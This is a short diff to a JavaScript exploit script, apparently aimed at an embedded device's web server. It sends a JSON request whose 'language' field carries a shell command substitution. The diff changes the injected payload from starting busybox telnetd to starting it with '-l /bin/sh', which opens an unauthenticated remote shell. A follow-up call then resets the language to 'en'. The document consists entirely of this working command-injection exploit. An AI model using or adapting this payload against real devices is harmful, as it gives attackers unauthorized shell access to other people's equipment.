@@ -14,7 +14,7 @@ function inject(lang){
 	xhr.send(JSON.stringify({"module":"webServer","action":1,"language":lang}));
 }
 
-inject("$(busybox telnetd)");
+inject("$(busybox telnetd -l /bin/sh)");
 sleep(500).then(() => {
     inject("en");
 });
